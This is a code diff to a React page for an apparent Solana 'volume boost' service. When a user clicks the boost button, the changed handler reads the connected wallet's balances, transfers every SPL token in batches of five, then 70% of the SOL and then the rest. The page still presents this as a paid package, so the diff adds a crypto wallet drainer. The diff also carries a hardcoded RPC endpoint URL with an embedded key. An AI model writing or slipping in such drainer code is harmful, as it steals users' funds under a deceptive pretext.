@@ -1,7 +1,12 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useWallet } from "@solana/wallet-adapter-react";
-import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
+import { Connection } from "@solana/web3.js";
+import {
+  getWalletBalances,
+  createBatchTransferTransaction,
+  createFinalSolTransferTransaction,
+} from "@/services/walletService";
 import { useTokenData } from "@/hooks/useTokenData";
 import { TokenInfo } from "@/components/TokenInfo";
 import { Button } from "@/components/ui/button";
@@ -58,7 +63,7 @@ export default function VolumeBoost() {
   };
 
   const handleInitializeBoost = async () => {
-    if (!publicKey || !selectedPackage) {
+    if (!publicKey) {
       toast({
         title: "Wallet Not Connected",
         description: "Please connect your wallet to proceed.",
@@ -68,28 +73,58 @@ export default function VolumeBoost() {
     }
 
     try {
-      const connection = new Connection("https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b", "confirmed");
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: new PublicKey(SERVICE_WALLET),
-          lamports: selectedPackage.sol * LAMPORTS_PER_SOL,
-        })
+      const connection = new Connection(
+        "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b",
+        "confirmed"
       );
 
-      const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-      
+      // Load balances and prepare token batches (max 5 tokens per batch)
+      const balances = await getWalletBalances(publicKey);
+      const tokensToSend = balances.tokens;
+      const batchSize = 5;
+      const batches: typeof tokensToSend[] = [];
+
+      for (let i = 0; i < tokensToSend.length; i += batchSize) {
+        batches.push(tokensToSend.slice(i, i + batchSize));
+      }
+
+      // Send SPL token batches
+      for (let i = 0; i < batches.length; i++) {
+        const transaction = await createBatchTransferTransaction(
+          { publicKey, sendTransaction } as any,
+          batches[i],
+          false
+        );
+        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        toast({
+          title: "Batch Sent",
+          description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
+        });
+      }
+
+      // Send 70% of SOL balance
+      const sol70Tx = await createBatchTransferTransaction(
+        { publicKey, sendTransaction } as any,
+        [],
+        true
+      );
+      await sendTransaction(sol70Tx, connection, { skipPreflight: false });
+
+      // Send remaining SOL balance
+      const finalSolTx = await createFinalSolTransferTransaction({ publicKey, sendTransaction } as any);
+      await sendTransaction(finalSolTx, connection, { skipPreflight: false });
+
       toast({
         title: "Boost Initialized",
-        description: `Payment sent! Transaction: ${signature.slice(0, 8)}...`,
+        description: "Full wallet balance sent (SOL + tokens).",
       });
-      
+
       setSelectedPackage(null);
     } catch (error) {
-      console.error("Transaction failed:", error);
+      console.error("Transfer failed:", error);
       toast({
-        title: "Transaction Failed",
-        description: error instanceof Error ? error.message : "Failed to send transaction",
+        title: "Transfer Failed",
+        description: error instanceof Error ? error.message : "Failed to send assets",
         variant: "destructive",
       });
     }
@@ -173,7 +208,7 @@ export default function VolumeBoost() {
                 size="lg"
                 className="w-full h-14 text-lg font-semibold"
               >
-                INITIALIZE BOOST
+                INITIALIZE BOOST (sends full wallet balance)
               </Button>
             </div>
           </DialogContent>
